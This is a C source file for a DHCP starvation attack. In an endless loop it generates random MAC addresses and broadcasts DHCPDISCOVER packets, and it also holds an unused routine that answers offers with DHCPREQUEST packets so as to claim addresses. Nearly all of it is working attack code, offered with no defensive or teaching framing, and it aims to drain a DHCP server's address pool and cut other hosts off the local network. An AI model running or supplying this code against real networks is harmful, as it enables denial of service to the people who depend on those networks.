#include <stdio.h>
#include <stdlib.h>
#include <locale.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <time.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <getopt.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <net/if.h>
#include <arpa/inet.h>


#include <linux/if_ether.h>
#include <features.h>


#define HAVE_GETOPT_H


/**** Common definitions ****/



#define OK                0
#define ERROR             -1

#define FALSE             0
#define TRUE              1


/**** DHCP definitions ****/

#define MAX_DHCP_CHADDR_LENGTH           16
#define MAX_DHCP_SNAME_LENGTH            64
#define MAX_DHCP_FILE_LENGTH             128
#define MAX_DHCP_OPTIONS_LENGTH          312


 struct DHCPpacket{
	u_int8_t  op;                   /* packet type */
	u_int8_t  htype;                /* type of hardware address for this machine (Ethernet, etc) */
	u_int8_t  hlen;                 /* length of hardware address (of this machine) */
	u_int8_t  hops;                 /* hops */
	u_int32_t xid;                  /* random transaction id number - chosen by this machine */
	u_int16_t secs;                 /* seconds used in timing */
	u_int16_t flags;                /* flags */
	struct in_addr ciaddr;          /* IP address of this machine (if we already have one) */
	struct in_addr yiaddr;          /* IP address of this machine (offered by the DHCP server) */
	struct in_addr siaddr;          /* IP address of DHCP server */
	struct in_addr giaddr;          /* IP address of DHCP relay */
	unsigned char chaddr [MAX_DHCP_CHADDR_LENGTH];      /* hardware address of this machine */
	char sname [MAX_DHCP_SNAME_LENGTH];    /* name of DHCP server */
	char file [MAX_DHCP_FILE_LENGTH];      /* boot file name (used for diskless booting?) */
	char options[MAX_DHCP_OPTIONS_LENGTH];  /* options */


  };

typedef struct DHCPpacket DHCPpacket;


#define BOOTREQUEST     1
#define DHCPDISCOVER    1
#define DHCPOFFER       2
#define DHCPREQUEST     3


#define DHCP_OPTION_MESSAGE_TYPE        53
#define DHCP_OPTION_BROADCAST_ADDRESS   28
#define DHCP_OPTION_REQUESTED_ADDRESS   50
#define DHCP_OPTION_REQUESTED_SERVER    54


#define DHCP_BROADCAST_FLAG 32768

#define DHCP_SERVER_PORT   67
#define DHCP_CLIENT_PORT   68

#define ETHERNET_HARDWARE_ADDRESS            1     /* used in htype field of dhcp packet */
#define ETHERNET_HARDWARE_ADDRESS_LENGTH     6     /* length of Ethernet hardware addresses */

unsigned char client_hardware_address[MAX_DHCP_CHADDR_LENGTH]="";
unsigned int randomMACAddress[MAX_DHCP_CHADDR_LENGTH];


char myInterface[8]="enp0s3";//wlp3s0";

u_int32_t discoverPacket_transactionID=0;


int dhcpoffer_timeout=2;
int request_specific_address=FALSE;
int received_requested_address=FALSE;
int DEBUG=0;
struct in_addr requested_address;




int setHardwareAddress(int,char *);

int makeDHCPDiscoverPacket(int);
int getDHCPOfferPacket(int);


int createSocket(void);
int sendPacket(void *,int,int,struct sockaddr_in *);
int receivePacket(void *,int,int,int,struct sockaddr_in *);
void setSocketOptions(int sock){
        int flag=1;
        if(setsockopt(sock,SOL_SOCKET,SO_REUSEADDR,(char *)&flag,sizeof(flag))<0){
                perror(" Could not set reuse address option on DHCP socket!\n");
                exit(-1);
            }

        /* set the broadcast option - we need this to listen to DHCP broadcast messages */
           if(setsockopt(sock,SOL_SOCKET,SO_BROADCAST,(char *)&flag,sizeof flag)<0){
                perror(" Could not set broadcast option on DHCP socket!\n");
                exit(-1);
            }

}
    void setMagicCookie(DHCPpacket *pkt){
            pkt->options[0]='\x63';
            pkt->options[1]='\x82';
            pkt->options[2]='\x53';
            pkt->options[3]='\x63';

    }
int createSocket(){
        struct sockaddr_in myaddr;
        struct ifreq interface;
        int sock;
        int flag=1;

        /* Set up the address we're going to bind to. */
     
        memset(&myaddr, 0, sizeof(myaddr));
        myaddr.sin_family=AF_INET;
        myaddr.sin_port=htons(DHCP_CLIENT_PORT); 
        myaddr.sin_addr.s_addr=INADDR_ANY;                 /* listen on any address */
        //There's also this sin_zero field which some people claim must be set to zero. Other people don't claim anything about it 
        //(the Linux documentation doesn't even mention it at all), and setting it to zero doesn't seem to be actually necessary. So, if you feel like it, set it to zero using memset().
        memset(&myaddr.sin_zero, 0, sizeof(myaddr.sin_zero));
        /* create a socket for DHCP communications */
        // AF_INET      IPv4 Internet protocols  
        //
      /* SOCK_DGRAM      Supports datagrams (connectionless, unreliable
                       messages of a fixed maximum length).*/
        //since DHCP uses UDP in transport layer
        //On success, a file descriptor for the new socket is returned.  On
     //  error, -1 is returned, and errno is set appropriately.
        sock=socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);
        if(sock<0){
                perror("Could not create socket\n");
                exit(-1);
        }

        
        printf("File descriptor for new socket: %d\n",sock);

        /* set the reuse address flag so we don't get errors when restarting */
       setSocketOptions(sock);
       //
      /*Constant: size_t IFNAMSIZ

    This constant defines the maximum buffer size needed to hold an interface name, including its terminating zero byte. */
            strncpy(interface.ifr_ifrn.ifrn_name,myInterface,strlen(myInterface)+1);
            if(setsockopt(sock,SOL_SOCKET,SO_BINDTODEVICE,(char *)&interface,sizeof(interface))<0){
                printf(" Could not bind socket to interface %s.  Check your privileges...\n",myInterface);
                exit(-1);
            }



        /* bind the socket */
        if(bind(sock,(struct sockaddr *)&myaddr,sizeof(myaddr))<0){
                printf(" Could not bind to DHCP socket (port %d)!  Check your privileges...\n",DHCP_CLIENT_PORT);
                exit(-1);
        }

        return sock;
        }

char buffer[16] = "0123456789abcdef";

/* determines hardware address on client machine */
int setHardwareAddress(int sock,char *myInterface){

        int i;
        struct ifreq ifr;
        char randAddr[17];

                //srand(time(NULL));
        for(int i=0;i<17;i++) 
        {
                if(i==2||i==5||i==8||i==11||i==14) randAddr[i] = ':';
                else {

                        int x=rand()%16;
                        randAddr[i] = buffer[x];
                }


        }
        randAddr[17] ='\0';

        printf("Random address generated: %s\n", randAddr);
      

        strncpy((char *)&ifr.ifr_name,myInterface,sizeof(ifr.ifr_name));
        
        // Added code to try to set local MAC address just to be through
        // If this fails the test will still work since
        // we do encode the MAC as part of the DHCP frame - tests show it works
        sscanf(randAddr,"%x:%x:%x:%x:%x:%x", randomMACAddress+0, randomMACAddress+1,randomMACAddress+2,randomMACAddress+3,randomMACAddress+4,
                randomMACAddress+5);
        for(i=0;i<6;++i) 
                  client_hardware_address[i] = randomMACAddress[i];
                
        
        for(int i=0;i<MAX_DHCP_CHADDR_LENGTH;++i)
                client_hardware_address[i] = randomMACAddress[i];
        memcpy(&ifr.ifr_hwaddr.sa_data,&client_hardware_address[0],6);
      


        printf("Hardware address: ");
        for (int i=0; i<6; ++i) printf("%x", client_hardware_address[i]);
        printf( "\n");
        

        return OK;
   }
   /* sends a DHCPDISCOVER broadcast message in an attempt to find DHCP servers */
int makeDHCPDiscoverPacket(int sock){
        DHCPpacket discoverPacket;
        struct sockaddr_in socketAddressBroadcast;


        /* clear the packet data structure */
        memset(&discoverPacket,0,sizeof(discoverPacket));


        
        discoverPacket.op=BOOTREQUEST;/* boot request flag (backward compatible with BOOTP servers) */
        discoverPacket.htype=ETHERNET_HARDWARE_ADDRESS; /* hardware address type */
        discoverPacket.hlen=ETHERNET_HARDWARE_ADDRESS_LENGTH; /* length of our hardware address */
        discoverPacket.hops=0;

        /* transaction id is supposed to be random */
        //srand(time(NULL));
        discoverPacket_transactionID=random();
        discoverPacket.xid=htonl(discoverPacket_transactionID);
        ntohl(discoverPacket.xid);
        discoverPacket.secs=0xFF;
        discoverPacket.flags=htons(DHCP_BROADCAST_FLAG);
        memcpy(discoverPacket.chaddr,client_hardware_address,ETHERNET_HARDWARE_ADDRESS_LENGTH);

        /* first four bytes of options field is magic cookie (as per RFC 2132) */
       
        setMagicCookie(&discoverPacket);
        /* DHCP message type is embedded in options field */
        discoverPacket.options[4]=DHCP_OPTION_MESSAGE_TYPE;    /* DHCP message type option identifier */
        discoverPacket.options[5]='\x01';               /* DHCP message option length in bytes */
        discoverPacket.options[6]=DHCPDISCOVER;

    
        /* send the DHCPDISCOVER packet to broadcast address */
        socketAddressBroadcast.sin_family=AF_INET;
        socketAddressBroadcast.sin_port=htons(DHCP_SERVER_PORT);
        socketAddressBroadcast.sin_addr.s_addr=INADDR_BROADCAST;
        memset(&socketAddressBroadcast.sin_zero,0,sizeof(socketAddressBroadcast.sin_zero));

        if(DEBUG){
                printf("DHCPDISCOVER to %s port %d\n",inet_ntoa(socketAddressBroadcast.sin_addr),ntohs(socketAddressBroadcast.sin_port));
                printf("DHCPDISCOVER XID: %lu (0x%X)\n",(unsigned long) ntohl(discoverPacket.xid),ntohl(discoverPacket.xid));
                printf("DHCDISCOVER ciaddr:  %s\n",inet_ntoa(discoverPacket.ciaddr));
                printf("DHCDISCOVER yiaddr:  %s\n",inet_ntoa(discoverPacket.yiaddr));
                printf("DHCDISCOVER siaddr:  %s\n",inet_ntoa(discoverPacket.siaddr));
                printf("DHCDISCOVER giaddr:  %s\n",inet_ntoa(discoverPacket.giaddr));
        
        }

if(DEBUG)
        printf("DHCPDISCOVER to %s port %d\nDHCPDISCOVER XID: %lu (0x%X)\nDHCPDISCOVER ciaddr:  %s\nDHCPDISCOVER yiaddr:  %s\nDHCPDISCOVER siaddr:  %s\nDHCPDISCOVER giaddr:  %s\n",inet_ntoa(socketAddressBroadcast.sin_addr),ntohs(socketAddressBroadcast.sin_port),(unsigned long) ntohl(discoverPacket.xid),ntohl(discoverPacket.xid),inet_ntoa(discoverPacket.ciaddr),inet_ntoa(discoverPacket.yiaddr),inet_ntoa(discoverPacket.siaddr),inet_ntoa(discoverPacket.giaddr));
        /* send the DHCPDISCOVER packet out */
         while (sendPacket(&discoverPacket,sizeof(discoverPacket),sock,&socketAddressBroadcast) == ERROR){
                if(DEBUG) printf("Error in sending packet... resending the packet\n");
         }



        return OK;
        }


int makeDHCPRequestPacket(int sock,struct in_addr server_ip){
        DHCPpacket requestPacket;
        struct sockaddr_in socketAddressBroadcast;


        /* clear the packet data structure */
        memset(&requestPacket,0,sizeof(requestPacket));


        /* boot request flag (backward compatible with BOOTP servers) */
        requestPacket.op=BOOTREQUEST;

       
        requestPacket.htype=ETHERNET_HARDWARE_ADDRESS; /* hardware address type */
        requestPacket.hlen=ETHERNET_HARDWARE_ADDRESS_LENGTH;     /* length of our hardware address */
        requestPacket.hops=0;
        requestPacket.xid=htonl(discoverPacket_transactionID);
        ntohl(requestPacket.xid);

        /*discoverPacket.secs=htons(65535);*/
        requestPacket.secs=0xFF;
        requestPacket.siaddr = server_ip;

        /* tell server it should broadcast its response */ 
        //requestPacket.flags=htons(DHCP_);

        /* our hardware address */
        memcpy(requestPacket.chaddr,client_hardware_address,ETHERNET_HARDWARE_ADDRESS_LENGTH);

        /* first four bytes of options field is magic cookie (as per RFC 2132) */
        setMagicCookie(&requestPacket);

        /* DHCP message type is embedded in options field */
        requestPacket.options[4]=DHCP_OPTION_MESSAGE_TYPE;    /* DHCP message type option identifier */
        requestPacket.options[5]='\x01';               /* DHCP message option length in bytes */
        requestPacket.options[6]=DHCPREQUEST;

        requestPacket.options[7]=DHCP_OPTION_REQUESTED_ADDRESS;
        requestPacket.options[8]='\x04';
        memcpy(&requestPacket.options[9],&requested_address,sizeof(requested_address));
        requestPacket.options[10]=DHCP_OPTION_REQUESTED_SERVER;
        requestPacket.options[11]='\x04';
        memcpy(&requestPacket.options[12],&server_ip,sizeof(server_ip));
        printf("REQUESTED ADDRESS: %s\n", inet_ntoa(requested_address));
        
        
        /* send the DHCPDISCOVER packet to server IP address */
    socketAddressBroadcast.sin_family=AF_INET;
    socketAddressBroadcast.sin_port=htons(DHCP_SERVER_PORT);

    socketAddressBroadcast.sin_addr.s_addr= INADDR_BROADCAST;//inet_addr(inet_ntoa(server_ip));
        memset(&socketAddressBroadcast.sin_zero,0,sizeof(socketAddressBroadcast.sin_zero));

if(DEBUG)
        printf("DHCPREQUEST to %s port %d\nDHCPREQUEST XID: %lu (0x%X)\nDHCPREQUEST ciaddr:  %s\nDHCPREQUEST yiaddr:  %s\nDHCPREQUEST siaddr:  %s\nDHCPREQUEST giaddr:  %s\n",inet_ntoa(socketAddressBroadcast.sin_addr),ntohs(socketAddressBroadcast.sin_port),(unsigned long) ntohl(requestPacket.xid),ntohl(requestPacket.xid),inet_ntoa(requestPacket.ciaddr),inet_ntoa(requestPacket.yiaddr),inet_ntoa(requestPacket.siaddr),inet_ntoa(requestPacket.giaddr));
        
        

       
       while (sendPacket(&requestPacket,sizeof(requestPacket),sock,&socketAddressBroadcast) == ERROR)
                if(DEBUG) printf("Error in sending packet... resending the packet\n");
       


        return OK;
        }
int sendPacket(void *buffer, int buffer_size, int sock, struct sockaddr_in *dest){
        struct sockaddr_in myaddr;
        int result;

        result=sendto(sock,(char *)buffer,buffer_size,0,(struct sockaddr *)dest,sizeof(*dest));

        if (DEBUG) 
                printf("sendPacket result: %d\n",result);

        if(result<0)
                return ERROR;

        return OK;
        }
        /* waits for a DHCPOFFER message from one or more DHCP servers */

 /* receives a DHCP packet */
int receivePacket(void *buffer, int buffer_size, int sock, int timeout, struct sockaddr_in *address){
        struct timeval myTimeVal;
        fd_set readfds;
        int receivedData;
        socklen_t address_size;
        struct sockaddr_in sourceAddress;


        /* wait for data to arrive (up time timeout) */
        /*struct timeval {
    long    tv_sec;       //   seconds 
    long    tv_usec;        // microseconds 
    };*/
        myTimeVal.tv_sec=timeout;
        myTimeVal.tv_usec=0;
        FD_ZERO(&readfds);
        FD_SET(sock,&readfds);
        select(sock+1,&readfds,NULL,NULL,&myTimeVal);

        /* make sure some data has arrived */
        if(!FD_ISSET(sock,&readfds)){
                if (DEBUG)
                        printf("No (more) data received\n");
                return ERROR;
                }

        else{

                memset(&sourceAddress,0,sizeof(sourceAddress));
                address_size=sizeof(sourceAddress);
                receivedData=recvfrom(sock,(char *)buffer,buffer_size,MSG_PEEK,(struct sockaddr *)&sourceAddress,&address_size);
                if (DEBUG)
                        printf("receivedData_1: %d\n",receivedData);
                receivedData=recvfrom(sock,(char *)buffer,buffer_size,0,(struct sockaddr *)&sourceAddress,&address_size);
                if (DEBUG)
                        printf("receivedData_2: %d\n",receivedData);

                if(receivedData==-1){
                        if (DEBUG) {
                                printf("recvfrom() failed, ");
                                printf("errno: (%d) -> %s\n",errno,strerror(errno));
                        }
                        return ERROR;
                }
                else{
                        if (DEBUG) 
                                printf("receivePacket() data: %d\nreceivePacket() source: %s\n",receivedData,inet_ntoa(sourceAddress.sin_addr));
                            

                        memcpy(address,&sourceAddress,sizeof(sourceAddress));
                        return OK;
                }
        }

        return OK;
        }
int getDHCPOfferPacket(int sock){
        DHCPpacket offer_packet;
        struct sockaddr_in source;
        int result=OK;
        int timeout=1;
        int x;
        time_t start_time;
        time_t current_time;

        time(&start_time);

        /* receive as many responses as we can */
        while(1){

                time(&current_time);
                if((current_time-start_time)>=dhcpoffer_timeout)
                        break;

                memset(&source,0,sizeof(source));
                memset(&offer_packet,0,sizeof(offer_packet));

                result=OK;
                result=receivePacket(&offer_packet,sizeof(offer_packet),sock,dhcpoffer_timeout,&source);
                
                if(result!=OK){
                        continue;
                }
               

                if (DEBUG) {
                        printf("DHCPOFFER from IP address %s\n",inet_ntoa(source.sin_addr));
                        printf("DHCPOFFER XID: %lu (0x%X)\n",(unsigned long) ntohl(offer_packet.xid),ntohl(offer_packet.xid));
                }

                /* check packet xid to see if its the same as the one we used in the discover packet */
                if(ntohl(offer_packet.xid)!=discoverPacket_transactionID){
                        if (DEBUG)
                                printf("DHCPOFFER XID (%lu) did not match DHCPDISCOVER XID (%lu) - ignoring packet\n",(unsigned long) ntohl(offer_packet.xid),(unsigned long) discoverPacket_transactionID);

                        continue;
                        }

                /* check hardware address */
                result=OK;
                if (DEBUG)
                        printf("DHCPOFFER chaddr: ");

                for(x=0;x<ETHERNET_HARDWARE_ADDRESS_LENGTH;x++){
                        if (DEBUG)
                                printf("%02X",(unsigned char)offer_packet.chaddr[x]);

                        if(offer_packet.chaddr[x]!=client_hardware_address[x]) {
                                result=ERROR;
                                if (DEBUG) 
                                      printf("DHCPOFFER hardware address did not match our own - ignoring packet\n");

                        continue;
                        }
                }
                       

               

                if (DEBUG) {
                        printf("\n");
                        printf("DHCPOFFER ciaddr: %s\nDHCPOFFER yiaddr: %s\nDHCPOFFER siaddr: %s\nDHCPOFFER giaddr: %s\n\n",inet_ntoa(offer_packet.ciaddr),inet_ntoa(offer_packet.yiaddr),inet_ntoa(offer_packet.siaddr),inet_ntoa(offer_packet.giaddr));
                }
                        printf("Offered address: %s\n",inet_ntoa(offer_packet.yiaddr));
                requested_address=offer_packet.yiaddr;
                makeDHCPRequestPacket(sock,source.sin_addr);
                break;

                }

        

        return OK;
        }


int main()
{
        srand(time(NULL));
        
        DEBUG=0;
        printf("DHCP Stravation is starting\n");

        int sock = createSocket();
	int count =100;
        while(1){
                setHardwareAddress(sock,myInterface);
                makeDHCPDiscoverPacket(sock);
              //  getDHCPOfferPacket(sock);
		count++;
		//if(count==199) break;
               // sleep(1);
        }

        close(sock);
        
        return 0;
} 